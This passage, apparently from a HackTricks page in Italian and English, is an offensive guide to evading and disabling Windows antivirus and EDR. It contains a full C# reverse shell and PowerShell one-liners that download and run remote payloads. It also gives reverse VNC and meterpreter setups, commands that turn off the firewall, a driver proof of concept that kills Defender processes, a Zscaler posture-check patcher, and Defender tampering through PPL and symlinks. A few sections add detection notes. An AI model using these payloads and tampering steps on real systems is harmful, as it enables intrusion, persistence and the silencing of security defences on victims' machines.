Permettendo l'accesso agli Interpreter Binaries e all'ambiente sulla SMB share puoi **eseguire codice arbitrario in questi linguaggi nella memoria** della macchina compromessa.

Il repo indica: Defender scansiona ancora gli script ma utilizzando Go, Java, PHP ecc. abbiamo **più flessibilità per bypassare le firme statiche**. I test con script di reverse shell casuali non offuscati in questi linguaggi si sono rivelati efficaci.

## TokenStomping

Token stomping è una tecnica che permette a un attaccante di **manipolare l'access token o un prodotto di sicurezza come un EDR o AV**, consentendo di ridurne i privilegi in modo che il processo non venga terminato ma non abbia i permessi per verificare attività dannose.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), it's easy to just deploy the Chrome Remote Desktop in a victims PC and then use it to takeover it and maintain persistence:
1. Scarica da https://remotedesktop.google.com/, clicca su "Set up via SSH", e poi clicca sul file MSI per Windows per scaricare l'MSI.
2. Esegui l'installer in modalità silenziosa sulla vittima (richiede privilegi admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e clicca next. Il wizard ti chiederà di autorizzare; clicca il pulsante Authorize per continuare.
4. Esegui il parametro fornito con qualche aggiustamento: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota il parametro pin che permette di impostare il pin senza usare la GUI).


## Advanced Evasion

L'evasion è un tema molto complicato, a volte bisogna tenere conto di molte diverse fonti di telemetry in un singolo sistema, quindi è praticamente impossibile rimanere completamente non rilevati in ambienti maturi.

Ogni ambiente contro cui ti confronti avrà i suoi punti di forza e di debolezza.

Ti incoraggio vivamente a guardare questo intervento di [@ATTL4S](https://twitter.com/DaniLJ94), per avere un'infarinatura sulle tecniche di Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Questo è anche un altro ottimo intervento di [@mariuszbit](https://twitter.com/mariuszbit) su Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) che **rimuoverà parti del binario** finché non **scoprirà quale parte Defender** considera dannosa e te la segnalerà.\
Un altro tool che fa **la stessa cosa è** [**avred**](https://github.com/dobin/avred) con un servizio web pubblico disponibile in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Fino a Windows10, tutte le versioni di Windows includevano un **Telnet server** che potevi installare (come amministratore) eseguendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fallo **avviare** all'avvio del sistema ed **eseguilo** ora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambia la porta telnet** (stealth) e disabilita il firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vuoi i download bin, non il setup)

**SUL HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Poi, sposta il binario _**winvnc.exe**_ e il file **nuovamente** creato _**UltraVNC.ini**_ all'interno della **victim**

#### **Reverse connection**

L'**attacker** dovrebbe **eseguire all'interno** del suo **host** il binario `vncviewer.exe -listen 5900` così sarà **preparato** a intercettare una reverse **VNC connection**. Poi, all'interno della **victim**: Avvia il demone `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere lo stealth devi evitare di fare alcune cose

- Non avviare `winvnc` se è già in esecuzione o scatenerai un [popup](https://i.imgur.com/1SROTTl.png). Controlla se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory o farà aprire [the config window](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per aiuto o scatenerai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
All'interno di GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **avvia il listener** con `msfconsole -r file.rc` e **esegui** il **xml payload** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**L'attuale defender terminerà il processo molto velocemente.**

### Compilazione del nostro reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### First C# Revershell

Compilalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando il compilatore
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e esecuzione automatica:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco di obfuscators per C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Esempio: usare python per build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Altro

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Disabilitare AV/EDR dallo spazio kernel

Storm-2603 ha sfruttato una piccola utility da console nota come **Antivirus Terminator** per disabilitare le protezioni endpoint prima di rilasciare il ransomware. Lo strumento porta il suo **vulnerable ma *signed* driver** e lo sfrutta per emettere operazioni privilegiate in kernel che anche i servizi AV in Protected-Process-Light (PPL) non possono bloccare.

Punti chiave
1. **Signed driver**: Il file consegnato su disco è `ServiceMouse.sys`, ma il binario è il driver legittimamente firmato `AToolsKrnl64.sys` di Antiy Labs’ “System In-Depth Analysis Toolkit”. Poiché il driver porta una firma Microsoft valida viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La prima riga registra il driver come **kernel service** e la seconda lo avvia così che `\\.\ServiceMouse` diventi accessibile da user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminare un processo arbitrario tramite PID (usato per terminare i servizi Defender/EDR) |
| `0x990000D0` | Eliminare un file arbitrario sul disco |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD salta completamente le protezioni in user-mode; codice che esegue nel kernel può aprire processi *protetti*, terminarli o manomettere oggetti kernel indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Detection / Mitigation
•  Abilitare la block list di driver vulnerabili di Microsoft (`HVCI`, `Smart App Control`) in modo che Windows rifiuti di caricare `AToolsKrnl64.sys`.  
•  Monitorare la creazione di nuovi *kernel* services e generare allerta quando un driver viene caricato da una directory scrivibile da tutti (world-writable) o non presente nella allow-list.  
•  Sorvegliare handle in user-mode verso oggetti dispositivo custom seguiti da sospette chiamate a `DeviceIoControl`.

### Bypass dei Posture Checks di Zscaler Client Connector tramite patching dei binari su disco

Zscaler’s **Client Connector** applica regole di device-posture localmente e si affida a Windows RPC per comunicare i risultati ad altri componenti. Due scelte progettuali deboli rendono possibile un bypass completo:

1. L'evaluazione della posture avviene **entirely client-side** (viene inviato un booleano al server).  
2. Gli endpoint RPC interni validano solo che l'eseguibile connesso sia **signed by Zscaler** (tramite `WinVerifyTrust`).

Patchando quattro binari firmati su disco entrambe le meccaniche possono essere neutralizzate:

| Binario | Logica originale patchata | Risultato |
|--------|---------------------------|-----------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Restituisce sempre `1` così ogni controllo risulta conforme |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | NOP-ed ⇒ qualsiasi processo (anche unsigned) può bindare le pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita con `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Controlli di integrità sul tunnel | Saltati |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Dopo aver sostituito i file originali e riavviato lo stack di servizi:

* **Tutti** i controlli di postura mostrano **green/compliant**.
* Binari non firmati o modificati possono aprire gli endpoint RPC su named-pipe (es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'host compromesso ottiene accesso senza restrizioni alla rete interna definita dalle policy di Zscaler.

Questo case study dimostra come decisioni di trust esclusivamente client-side e semplici controlli di firma possano essere sconfitti con poche patch di pochi byte.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) impone una gerarchia signer/level in modo che solo processi protetti con livello uguale o superiore possano manomettersi a vicenda. In ambito offensivo, se riesci a lanciare legittimamente un eseguibile abilitato PPL e controllarne gli argomenti, puoi convertire funzionalità benign (es., logging) in una primitive di scrittura vincolata, supportata da PPL, verso directory protette usate da AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Il eseguibile di sistema firmato `C:\Windows\System32\ClipUp.exe` si auto-avvia e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Quando viene avviato come processo PPL, la scrittura del file avviene con supporto PPL.
- ClipUp non riesce a interpretare percorsi contenenti spazi; usare 8.3 short paths per puntare a posizioni normalmente protette.

8.3 short path helpers
- Elenca i nomi short: `dir /x` in ciascuna directory parent.
- Derivare il percorso short in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Avviare il LOLBIN compatibile PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (p.es., CreateProcessAsPPL).
2) Passare l'argomento log-path di ClipUp per forzare la creazione di un file in una directory AV protetta (p.es., Defender Platform). Usare nomi 8.3 short se necessario.
3) Se il binario target è normalmente aperto/bloccato dall'AV mentre è in esecuzione (p.es., MsMpEng.exe), programmare la scrittura all'avvio prima che l'AV si avvii installando un servizio di avvio automatico che venga eseguito in modo affidabile prima. Verificare l'ordine di avvio con Process Monitor (boot logging).
4) Al reboot la scrittura supportata da PPL avviene prima che l'AV blocchi i suoi binari, corrompendo il file target e impedendone l'avvio.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Non puoi controllare il contenuto che ClipUp scrive oltre alla posizione; la primitiva è più adatta alla corruzione che all'iniezione precisa di contenuti.
- Richiede admin locale/SYSTEM per installare/avviare un servizio e una finestra di reboot.
- Il timing è critico: il target non deve essere aperto; l'esecuzione all'avvio evita i blocchi dei file.

Detections
- Creazione di processi con `ClipUp.exe` con argomenti insoliti, specialmente se generati da launcher non standard, attorno all'avvio del sistema.
- Nuovi servizi configurati per auto-avviarsi con binari sospetti e che si avviano sistematicamente prima di Defender/AV. Indagare la creazione/modifica di servizi prima dei fallimenti di avvio di Defender.
- Monitoraggio dell'integrità dei file su binari/Directory Platform di Defender; creazioni/modifiche inaspettate di file da parte di processi con flag protected-process.
- Telemetria ETW/EDR: cercare processi creati con `CREATE_PROTECTED_PROCESS` e uso anomalo del livello PPL da parte di binari non-AV.

Mitigations
- WDAC/Code Integrity: limitare quali binari firmati possono essere eseguiti come PPL e sotto quali parent; bloccare invocazioni di ClipUp al di fuori dei contesti legittimi.
- Hygiene dei servizi: limitare la creazione/modifica di servizi auto-avvianti e monitorare manipolazioni dell'ordine di avvio.
- Assicurarsi che tamper protection di Defender e le protezioni di early-launch siano abilitate; indagare errori di avvio che indicano corruzione di binari.
- Considerare la disabilitazione della generazione dei nomi brevi 8.3 sui volumi che ospitano strumenti di sicurezza se compatibile con il vostro ambiente (testare accuratamente).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender sceglie la piattaforma da cui viene eseguito enumerando le sottocartelle sotto:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Seleziona la sottocartella con la stringa di versione lexicograficamente più alta (es., `4.18.25070.5-0`), quindi avvia i processi del servizio Defender da lì (aggiornando di conseguenza i percorsi del servizio/registro). Questa selezione si fida delle voci di directory inclusi i reparse point di directory (symlink). Un amministratore può sfruttare questo per reindirizzare Defender verso un percorso scrivibile dall'attaccante e ottenere DLL sideloading o la disruption del servizio.

Preconditions
- Amministratore locale (necessario per creare directory/symlink sotto la cartella Platform)
- Capacità di riavviare o forzare la re-selezione della piattaforma di Defender (riavvio del servizio all'avvio)
- Solo strumenti integrati necessari (mklink)

Why it works
- Defender blocca le scritture nelle proprie cartelle, ma la sua selezione della piattaforma si fida delle voci di directory e sceglie la versione lexicograficamente più alta senza validare che il target risolva in un percorso protetto/attendibile.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink a una directory di versione superiore all'interno di Platform che punti alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (riavvio consigliato):
```cmd
shutdown /r /t 0
```
4) Verificare che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Dovresti osservare il nuovo percorso del processo sotto `C:\TMP\AV\` e la configurazione del servizio/registro che riflette quella posizione.

Post-exploitation options
- DLL sideloading/code execution: Posizionare/sostituire DLL che Defender carica dalla sua directory dell'applicazione per eseguire codice nei processi di Defender. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Rimuovere il version-symlink in modo che al prossimo avvio il percorso configurato non venga risolto e Defender non riesca ad avviarsi:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Nota che questa tecnica non fornisce escalation di privilegi di per sé; richiede diritti di amministratore.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Le red team possono spostare l'evasion a runtime fuori dall'implant C2 e nel modulo target stesso agganciando la sua Import Address Table (IAT) e instradando API selezionate attraverso codice position‑independent controllato dall'attaccante (PIC). Questo generalizza l'evasione oltre la piccola superficie di API che molti kit espongono (es. CreateProcessA), e estende le stesse protezioni a BOFs e post‑exploitation DLLs.

Approccio ad alto livello
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Perché IAT hooking qui
- Funziona per qualsiasi codice che utilizzi l'import agganciato, senza modificare il codice dello strumento o fare affidamento su Beacon per fungere da proxy per API specifiche.
- Copre post‑ex DLLs: hooking LoadLibrary* permette di intercettare i load di moduli (es. System.Management.Automation.dll, clr.dll) e applicare lo stesso masking/stack evasion alle loro chiamate API.
- Ripristina l'uso affidabile dei comandi post‑ex che generano processi contro rilevazioni basate sulla call‑stack avvolgendo CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Note
- Applica la patch dopo le relocazioni/ASLR e prima del primo utilizzo dell'import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Mantieni i wrapper piccoli e PIC-safe; risolvi la vera API tramite il valore IAT originale che hai catturato prima del patching o tramite LdrGetProcedureAddress.
- Usa transizioni RW → RX per PIC e evita di lasciare pagine writable+executable.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- Questo sconfigge i rilevamenti che si aspettano stack canoniche da Beacon/BOFs verso API sensibili.
- Abbinalo a tecniche di stack cutting/stack stitching per atterrare all'interno dei frame attesi prima del prologo dell'API.

Integrazione operativa
- Preponi il reflective loader alle DLL post‑ex in modo che il PIC e gli hook si inizializzino automaticamente quando la DLL viene caricata.
- Usa uno script Aggressor per registrare le API target così Beacon e BOFs traggono vantaggio in modo trasparente dalla stessa via di evasione senza modifiche al codice.

Considerazioni Detection/DFIR
- IAT integrity: voci che risolvono in indirizzi non‑image (heap/anon); verifica periodica dei puntatori di import.
- Stack anomalies: indirizzi di ritorno che non appartengono a immagini caricate; transizioni brusche verso PIC non‑image; ascendenza RtlUserThreadStart incoerente.
- Loader telemetry: scritture in-process su IAT, attività precoce in DllMain che modifica import thunks, regioni RX inaspettate create al caricamento.
- Image‑load evasion: se si fa hooking di LoadLibrary*, monitora caricamenti sospetti di automation/clr assemblies correlati con eventi di memory masking.

Blocchi costitutivi e esempi correlati
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## Riferimenti

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
